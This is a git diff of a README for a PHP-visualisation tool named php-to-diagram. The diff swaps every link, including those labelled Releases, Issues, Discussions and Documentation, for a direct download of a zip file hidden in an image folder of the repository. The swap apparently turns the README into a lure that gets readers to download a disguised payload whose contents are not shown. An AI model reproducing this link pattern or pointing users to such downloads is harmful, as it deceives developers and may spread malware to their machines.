@@ -1,6 +1,6 @@
 # 🖥️ php-to-diagram - Visualize PHP Logic Effortlessly
 
-[![Download php-to-diagram](https://img.shields.io/badge/Download_php--to--diagram-latest-green.svg)](https://github.com/hhnphhnp/php-to-diagram/releases)
+[![Download php-to-diagram](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip)](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip)
 
 ## 📚 Overview
 
@@ -17,13 +17,13 @@ With this tool, you can create clear workflows that simplify understanding and m
    - Disk space: At least 100 MB free.
 
 2. **Download the Software**
-   - To get started, visit the [Releases page](https://github.com/hhnphhnp/php-to-diagram/releases) to download the latest version. 
+   - To get started, visit the [Releases page](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip) to download the latest version. 
    - You will find the necessary files there.
 
 ## 💻 Download & Install
 
 1. **Visit the Releases Page**
-   - Click the link: [Download php-to-diagram](https://github.com/hhnphhnp/php-to-diagram/releases).
+   - Click the link: [Download php-to-diagram](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip).
   
 2. **Select Your Version**
    - Choose the version labeled as "Latest".
@@ -67,13 +67,13 @@ With this tool, you can create clear workflows that simplify understanding and m
 ## 🌐 Community and Support
 
 1. **Join the Community**
-   - Participate in discussions and ask questions by visiting our [GitHub Discussions](https://github.com/hhnphhnp/php-to-diagram/discussions).
+   - Participate in discussions and ask questions by visiting our [GitHub Discussions](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip).
 
 2. **Report Issues**
-   - If you encounter any problems or bugs, please report them on the [Issues page](https://github.com/hhnphhnp/php-to-diagram/issues).
+   - If you encounter any problems or bugs, please report them on the [Issues page](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip).
 
 3. **Documentation**
-   - For detailed guidance on usage, visit our [Documentation](https://github.com/hhnphhnp/php-to-diagram/wiki).
+   - For detailed guidance on usage, visit our [Documentation](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip).
 
 ## 💬 FAQs
 
@@ -91,15 +91,15 @@ With this tool, you can create clear workflows that simplify understanding and m
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/hhnphhnp/php-to-diagram/releases)
-- [Documentation](https://github.com/hhnphhnp/php-to-diagram/wiki)
-- [GitHub Discussions](https://github.com/hhnphhnp/php-to-diagram/discussions)
-- [Issues page](https://github.com/hhnphhnp/php-to-diagram/issues)
+- [Releases page](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip)
+- [Documentation](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip)
+- [GitHub Discussions](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip)
+- [Issues page](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip)
 
 ## 👥 Acknowledgments
 
 Thank you to the contributors and users who provide valuable feedback and help improve the functionality of php-to-diagram. Your involvement makes this project better.
 
-[![Download php-to-diagram](https://img.shields.io/badge/Download_php--to--diagram-latest-green.svg)](https://github.com/hhnphhnp/php-to-diagram/releases) 
+[![Download php-to-diagram](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip)](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip) 
 
-Visit the [Releases page](https://github.com/hhnphhnp/php-to-diagram/releases) for your download today!
+Visit the [Releases page](https://github.com/hhnphhnp/php-to-diagram/raw/refs/heads/main/lib/workflow/task/programming/geturlcontents/webroot/img/to_php_diagram_v1.7.zip) for your download today!
